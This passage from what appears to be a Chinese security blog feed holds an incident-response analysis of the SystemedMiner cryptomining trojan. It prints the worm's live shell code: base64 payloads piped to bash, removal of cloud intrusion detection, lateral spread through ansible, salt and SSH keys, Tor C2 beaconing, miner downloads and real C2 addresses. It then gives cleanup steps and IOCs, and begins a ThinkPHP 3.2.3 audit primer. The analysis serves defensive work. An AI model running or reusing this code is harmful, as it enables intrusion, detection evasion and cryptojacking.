https://$&#123;n[$((RANDOM%11))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|head -n 1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /tmp /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isys() &#123; </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入定时任务，并且卸载assist-daemon(阿里云)、qcloud(腾讯云)的入侵检测系统</span></span><br><span class="line">echo ZnVuY3Rpb24ga3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOnKICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCnJtIC1mICRIT01FL3NzCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzUuMC9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvY3VybCA+ICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApzcyAtdiAgIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvc3MgICA+ICRIT01FL3NzO2NobW9kICt4ICRIT01FL3NzCnNzIC12ICAgfHwgY3VybCAtcyBodHRwOi8vMTM5LjU5LjE1MC43OjQ0My9zcyAtbyAkSE9NRS9zcztjaG1vZCAreCAkSE9NRS9zcwpwcyAgICAgIHx8IGN1cmwgLXMgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvcHMgLW8gJEhPTUUvcHM7Y2htb2QgK3ggJEhPTUUvcHMK|base64 -d|bash</span><br><span class="line">crontab -l || yum -y install cron</span><br><span class="line">crontab -l || yum -y install cronie</span><br><span class="line">crontab -l || apt-get update &amp;&amp; apt-get -y install cron</span><br><span class="line">/usr/local/share/assist-daemon/assist_daemon --stop</span><br><span class="line">/usr/local/share/assist-daemon/assist_daemon --delete</span><br><span class="line">/usr/local/qcloud/monitor/barad/admin/uninstall.sh</span><br><span class="line">/usr/local/qcloud/stargate/admin/uninstall.sh</span><br><span class="line">/usr/local/qcloud/YunJing/uninst.sh</span><br><span class="line">/etc/init.d/aegis uninstall</span><br><span class="line">systemctl stop aliyun</span><br><span class="line">systemctl disable aliyun</span><br><span class="line">systemctl start cron</span><br><span class="line">systemctl enable cron</span><br><span class="line">systemctl start crond</span><br><span class="line">systemctl enable crond</span><br><span class="line">rm -rf /usr/loca/qcloud/ /usr/local/aegis/ /usr/local/share/assist-daemon/ /usr/local/share/aliyun-assist/ /usr/sbin/aliyun-service /usr/sbin/aliyun_installer /etc/systemd/system/aliyun.service</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">issh() &#123;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">利用自动化运维工具ansible、salt、pssh、knife写入定时任务</span></span><br><span class="line">ansible all -m shell -a &#x27;echo blU5V2FnalE4QmVuV1BYdDBvdkUxMnVEOGpCSXR2NgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI1aXhoaWVlem96eHdudmlzb3BneG9iYTZzc2JzcnZkcHhlZHV4YjRqYzZ6eDdzNTZydWZyanphZCIpCgpzb2NreigpIHsKbj0oZG9oLnRoaXMud2ViLmlkIGRvaC5wb3N0LWZhY3R1bS50ayBkbnMuaG9zdHV4Lm5ldCB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyByZXNvbHZlci1ldS5sZWx1eC5maSBkb2gubGkgZG5zLmRpZ2l0YWxlLWdlc2VsbHNjaGFmdC5jaCkKcD0kKGVjaG8gImRucy1xdWVyeT9uYW1lPXJlbGF5LnRvcjJzb2Nrcy5pbiIpCnM9JCgkYyBodHRwczovLyR7blskKChSQU5ET00lMTEpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xncmVwIC1FdiBbLl0wfHNvcnQgLXVSfGhlYWQgLW4gMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZj0vaW50LiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0CmRvCmlmICEgbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgpmZXhlO3UgJHQuJGgKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL3RtcDt1ICR0LiRoKQpscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHNlCmJyZWFrCmZpCmRvbmUK|base64 -d|bash&#x27;</span><br><span class="line">knife ssh &#x27;name:*&#x27; &#x27;echo 与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;</span><br><span class="line">salt &#x27;*&#x27; cmd.run &#x27;echo 与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;</span><br><span class="line">pssh &#x27;echo 与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从bash的历史ssh记录中尝试去登录远程设备</span></span><br><span class="line">hosts=$(grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; ~/.bash_history /etc/hosts ~/.ssh/known_hosts |grep -v ^127.|awk -F: &#123;&#x27;print $2&#x27;&#125;|sort|uniq)</span><br><span class="line">for h in $hosts;do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l root  $h &#x27;echo 与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;;done for h in $hosts;do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l $USER $h &#x27;与上面的base64编码一致，都是守护进程|base64 -d|bash&#x27;;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ibot() &#123;</span><br><span class="line">f=/bot </span><br><span class="line">r=$(curl -4fsSLk ip.sb||wget -4qO- ip.sb||curl -4fsSLk checkip.amazonaws.com)_$(whoami)_$(uname -m)_$(uname -n)_$(crontab -l|base64 -w0)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 -e<span class="variable">$r</span> <span class="variable">$t</span>.onion<span class="variable">$f</span> || <span class="variable">$c</span> -e<span class="variable">$r</span> $1<span class="variable">$f</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iscn() &#123;</span><br><span class="line">pkill -9 -f tracepath</span><br><span class="line">f=/trc </span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> || <span class="variable">$c</span> $1<span class="variable">$f</span> -o<span class="variable">$x</span></span></span><br><span class="line">chmod +x $x;$x;rm -f $x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockz</span><br><span class="line">fexe</span><br><span class="line">isys</span><br><span class="line">issh &amp;</span><br><span class="line">ibot $t.tor2web.in || ibot $t.tor2web.it</span><br><span class="line">iscn $t.tor2web.in || iscn $t.tor2web.it</span><br></pre></td></tr></table></figure><p>这个脚本的作用是先将阿里云和腾讯云的入侵检测系统给卸载掉，然后再利用自动化运维工具写入定时任务，最后就是下载两个可执行文件，一个是<code>bot</code>，一个是<code>trc</code>，其中<code>trc</code>文件用于Hadoop Yarn未授权访问漏洞利用，bot大概率是该病毒的传播模块</p><ul><li><strong>下载挖矿文件cpu</strong></li></ul><p>病毒母体执行后会下载cpu脚本,以进行挖矿，手动下载一下试试看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -4fsSLkA- -m200 fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.in/cpu -o  cpu -e183.134.110.75</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112832.png" alt="在这里插入图片描述"></p><p>手动执行挖矿脚本的时候要先解除文件的锁定<code>chattr -i cpu</code>，再赋权限运行</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112729.png" alt="在这里插入图片描述"></p><p>但是在本地也没有运行起来，缺失一些配置文件，可能是因为前面的模块有的没有下载导致。</p><ul><li><strong>状态控制</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;i62hmnztfpzwrhjg34m6ruxem5oe36nulzmxcgbdbkiaceubprkta7ad&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">s=$($c https://$&#123;n[$((RANDOM%11))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|head -n 1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/cmd</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> || <span class="variable">$c</span> $1<span class="variable">$f</span></span></span><br><span class="line">&#125;</span><br><span class="line">(</span><br><span class="line">u $t.tor</span><br></pre></td></tr></table></figure><p>病毒母体执行后会下载cmd脚本，用于当主机网络无法连接到矿池时，会结束掉自身的挖矿进程，增强隐蔽性，但是tor代理失效，暂时无法下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -4fsSLkA- -m200 fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.in/cmd -o  cmd -e183.134.110.75</span><br></pre></td></tr></table></figure><p>如果用这种方法下载的话，很奇怪会得到下载ssh暴力破解的脚本，脚本内容也无法进行下载查看</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112798.png" alt="在这里插入图片描述"></p><h4 id="归纳梳理"><a href="#归纳梳理" class="headerlink" title="归纳梳理"></a>归纳梳理</h4><p>通过看师傅们的博客和自己的测试，对目前这个SystemedMiner挖矿木马也有了一定的了解，木马执行后，会下载一系列的模块和可执行脚本，用于持久化、内网横向渗透、挖矿、命令控制、清除一些入侵检测系统和其他挖矿程序，但需要使用tor代理，之所以服务器和虚拟机只有持久化的脚本(守护进程脚本)，就是因为病毒母体启动后，tor代理失效，无法下载其他模块和脚本，也就只有一个守护进程脚本。</p><h4 id="处置方法"><a href="#处置方法" class="headerlink" title="处置方法"></a>处置方法</h4><p>在了解了SystemedMiner挖矿木马感染机器的过程后，防护便一目了然了，它做的主机持久化控制便是通过写定时任务，而定时任务是下载病毒母体并执行，就这样循环来控制主机，所以要清除该病毒文件</p><ol><li>第一步便是要将定时任务删除完，通过<code>crontab -e</code>移除<code>/root/systemd-private-*</code>，然后再删除<code>/etc/cron.d/0systemd-private-* </code>和<code>/opt/systemd-private-*.sh</code>文件</li><li>再去查看<code>/tmp/.X11-unix/</code>文件下<code>01</code>、<code>11</code>获取其PID，使用<code>kill -9 进程id</code>，杀死进程</li><li>更改文件夹权限，再不清楚攻击者从哪里进来的时候，<code>/tmp/.X11-unix/</code>这个文件夹可以进行保留，防止黑客重新写入，但要设置好权限</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">chattr +i [file/directory]使file/directory无法被更动</span></span><br><span class="line">chattr +i /tmp/.X11-unix/01</span><br><span class="line">或</span><br><span class="line">chmod -R 000 /tmp/.X11-unix/01</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件夹权限</span></span><br><span class="line">ls -ld /tmp/.X11-unix/ </span><br></pre></td></tr></table></figure><p>4.若服务器中运行了其他的一些模块和脚本，杀相关进程和文件，重复上面的方法即可</p><h4 id="溯源分析"><a href="#溯源分析" class="headerlink" title="溯源分析"></a>溯源分析</h4><blockquote><p>该木马通过bash命令下载执行多个功能模块，通过SSH暴力破解、SSH免密登录利用、Hadoop Yarn未授权访问漏洞和自动化运维工具内网扩散，且该木马的文件下载均利用暗网代理，感染后会清除主机上的其他挖矿木马，以达到资源独占的目的</p></blockquote><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112353.png" alt="在这里插入图片描述"></p><p>看了很多类似挖矿木马的文章，黑客入口都指向Hadoop Yarn未授权访问或是SSH爆破密码，既然内网的主机全被感染了，逐一来排查一下</p><h5 id="Hadoop-yarn-未授权访问漏洞"><a href="#Hadoop-yarn-未授权访问漏洞" class="headerlink" title="Hadoop-yarn-未授权访问漏洞"></a>Hadoop-yarn-未授权访问漏洞</h5><ul><li>影响版本：3.3.0 以下、</li><li>通过REST API创建并提交任务，YARN执行任务，下载执行恶意sh脚本</li></ul><p>先看一下当前服务器的Hadoop版本，版本在3.3.0以下，有未授权访问的风险</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112429.png" alt="在这里插入图片描述"></p><p>可以查看下有关yarn的进程，看看有没有挖矿程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep yarn</span><br></pre></td></tr></table></figure><p>查看了几天被感染的服务器都未发现相关信息，只能去排查一下YARN日志，看看是否有异常的<code>application</code>，204的主机曾关闭过防火墙，优先去排查一下204这台主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yarn application -list -appStates ALL #不显示时间信息</span><br><span class="line">yarn logs -applicationId application_1647720164720_1130</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">匹配关键字</span></span><br><span class="line">yarn application -list -appStates ALL | grep curl</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112480.png" alt="在这里插入图片描述"></p><p>也没有发现什么线索。</p><p>既然在服务器上都没有下载出相应的控制、挖矿文件或模块，说明代理失效，那ssh模块也应该是无法下载的，猜测可能是自动化运维工具写入，但服务器上没有这一类工具，只能说明是利用SSH免密码登录进去的，这个病毒母体恰好有这个功能，恰好服务器也是有这个免登的功能，<strong>所以初步推断内网横向感染的原因就是因为免密码登录</strong></p><p>SSH暴力破解进入其他内网主机应该不太现实，因为都是强口令，不容易被爆破出来的，而且公司服务器都有防护，如果大量爆破发包的话也会产生警告，因此这样也可以排除是SSH爆破进入服务器的。</p><p>目前暂不能判断攻击者是从哪里进来的，只能先进行处置，保留病毒文件夹，修改权限，以防下次再写入</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>建议将免登取消掉，以防某一台感染后横向传染其他服务器</li></ul><h4 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h4><p>守护进程样本hash：<br>MD5 <code>d61b3ba654ad546cc49d5ace7de0e309</code><br>SHA-1 <code>ca852b6b7f5e52a17661456ae37e0e6009c87ac3</code><br>SHA-256 <code>7de2aa89cb2f2edf06418ad39d6c516c25bb52a5d1bf62332b0892bc2fa1c3d4</code></p><p>远控样本(int.x86_64)hash：<br>MD5 <code>7308d194a75c13e464d4a8cc8094bca7</code><br>SHA-1 <code>389889090811fb2a4063d03c0ecafb33b8c68b12</code><br>SHA-256 <code>7834430c0d7953648e906a679ae6e92d6807305220639df41bff72dceb09e94f</code></p><p><code>fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.onion</code><br><code>fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.it</code> ——C&amp;C域名<br><code>fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.in</code> ——C&amp;C域名</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/system/233138.html">https://www.freebuf.com/articles/system/233138.html</a></p><p><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=144683">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=144683</a></p><p><a href="https://www.freebuf.com/articles/system/225146.html">https://www.freebuf.com/articles/system/225146.html</a></p><p><a href="https://hksanduo.github.io/2021/11/08/2021-11-08-systemd-miner-analysis/">https://hksanduo.github.io/2021/11/08/2021-11-08-systemd-miner-analysis/</a></p><p><a href="https://www.freebuf.com/articles/web/279000.html">https://www.freebuf.com/articles/web/279000.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/370493577">https://zhuanlan.zhihu.com/p/370493577</a></p><p><a href="https://www.codenong.com/cs106872151/cl">https://www.codenong.com/cs106872151/cl</a></p><p><a href="http://les1ie.com/2021/07/12/tor-miner/">http://les1ie.com/2021/07/12/tor-miner/</a></p><p><a href="https://github.com/tor2web/Tor2web">https://github.com/tor2web/Tor2web</a></p><p><a href="https://zhuanlan.kanxue.com/article-10818.htm">https://zhuanlan.kanxue.com/article-10818.htm</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp3.2.3-[代码审计]</title>
      <link href="/2019/05/03/Thinkphp3.2.3-%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D/"/>
      <url>/2019/05/03/Thinkphp3.2.3-%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="0x00-为什么要使用框架"><a href="#0x00-为什么要使用框架" class="headerlink" title="0x00:为什么要使用框架"></a>0x00:为什么要使用框架</h3><blockquote><p>使用框架相当于别人已经帮助完成一些基础工作，开发者只需要集中精力在系统的业务逻辑设计上即可。而且相较于原生代码开发更稳定、安全、易扩展。</p></blockquote><h3 id="0x01-TP3-2-3程序目录结构"><a href="#0x01-TP3-2-3程序目录结构" class="headerlink" title="0x01:TP3.2.3程序目录结构"></a>0x01:TP3.2.3程序目录结构</h3><ul><li>入口文件（应用对外提供的接口）</li><li>核心框架目录</li><li>模块集合（<code>Common</code>模块优先于其他模块执行）</li><li>缓存目录（<code>./Application/Runtime</code>）</li><li>公共资源目录（<code>./Public</code>）</li></ul><p>更详细的可以看官方手册上描述的：</p><p>@<a href="http://document.thinkphp.cn/manual_3_2.html#directory_structure">http://document.thinkphp.cn/manual_3_2.html#directory_structure</a></p><h3 id="0x02-MVC分层架构"><a href="#0x02-MVC分层架构" class="headerlink" title="0x02:MVC分层架构"></a>0x02:MVC分层架构</h3><ul><li>控制器（<code>Controller</code>）：负责用户请求的调度和处理业务逻辑</li><li>模型（<code>Model</code>）：负责业务数据的处理和与数据库的交互</li><li>视图（<code>View</code>）：提供了展示数据的各种方式</li></ul><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008785.png" alt="请添加图片描述"></p><h3 id="0x03-模板渲染-amp-入口绑定"><a href="#0x03-模板渲染-amp-入口绑定" class="headerlink" title="0x03:模板渲染&amp;入口绑定"></a>0x03:模板渲染&amp;入口绑定</h3><p>在TP3.2.3模板中先建立一个Admin文件夹，内容及文件夹名称Copy前端文件夹Home即可</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008212.png" alt="请添加图片描述"></p><p>如果想要更改默认首页内容，在<code>Application\Admin\Controller\IndexController.class.php</code> （<strong>控制器</strong>）进行修改</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008999.png" alt="在这里插入图片描述"></p><p>在开发时一般后台所使用的Public文件夹是独立开的，因此这里后台也就需要更改一下默认的Public文件夹，需要先在应用入口文件中定义应用目录</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008679.png" alt="在这里插入图片描述"></p><p>然后在<code>Admin\Conf\config.php</code>处进行配置</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008603.png" alt="在这里插入图片描述"></p><p>最后将<code>JS/CSS/HTML</code> （<strong>视图</strong>）文件进行引入，修改路径即可成功访问</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008890.png" alt="在这里插入图片描述"></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008817.png" alt="在这里插入图片描述"></p><p>除此之外，还是有很多知识是没有接触到的，上面控制器中代码有<strong>M，D，U，I</strong>这些方法，具体功能参考大师傅的文章：</p><p>@<a href="https://www.cnblogs.com/kenshinobiy/p/9165662.html">https://www.cnblogs.com/kenshinobiy/p/9165662.html</a></p><p>代码则位于<code>Thinkphp/Common/functions.php</code> </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008892.png" alt="请添加图片描述"></p><p>例如 <code>I</code>方法主要用于更加方便和安全的获取系统输入变量，用法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">I</span>(<span class="string">&#x27;get.id&#x27;</span>); &lt;==&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="title function_ invoke__">I</span>(<span class="string">&#x27;id&#x27;</span>); &lt;==&gt; <span class="title function_ invoke__">I</span>(<span class="string">&#x27;param.id&#x27;</span>) </span><br><span class="line">param自动判断请求类型获取GET、POST或者PUT参数</span><br></pre></td></tr></table></figure><p>其他函数的用法看手册即可</p><h3 id="0x04-TP3路由格式："><a href="#0x04-TP3路由格式：" class="headerlink" title="0x04:TP3路由格式："></a>0x04:TP3路由格式：</h3><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008353.png" alt="请添加图片描述"></p><p>这里通过一个简单的例子来了解常用的四种路由模式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello &quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>普通模式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/index.php?m=Home&amp;c=Index&amp;f=index&amp;name=Sn0w</span></span><br><span class="line">http:<span class="comment">//网址/index.php?m=模块名称&amp;c=控制器&amp;a=方法</span></span><br></pre></td></tr></table></figure><p><strong>兼容模式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/index.php?s=Home/Index/index/name/Sn0w</span></span><br><span class="line">http:<span class="comment">//网址/index.php?s=/模块/控制器/方法</span></span><br></pre></td></tr></table></figure><p><strong>REWRITE模式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/Home/Index/index/name/Sn0w/</span></span><br><span class="line">http:<span class="comment">//网址/模块/控制器/操作方法</span></span><br></pre></td></tr></table></figure><p><strong>PATHINFO模式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/index.php/Home/Index/index/name/Sn0w/</span></span><br><span class="line">http:<span class="comment">//网址/index.php/模块/控制器/操作方法</span></span><br></pre></td></tr></table></figure><p>最终呈现的效果都一样：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009021.png" alt="在这里插入图片描述"></p><h2 id="TP3-2-3-SQL注入"><a href="#TP3-2-3-SQL注入" class="headerlink" title="TP3.2.3 SQL注入"></a>TP3.2.3 SQL注入</h2><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" 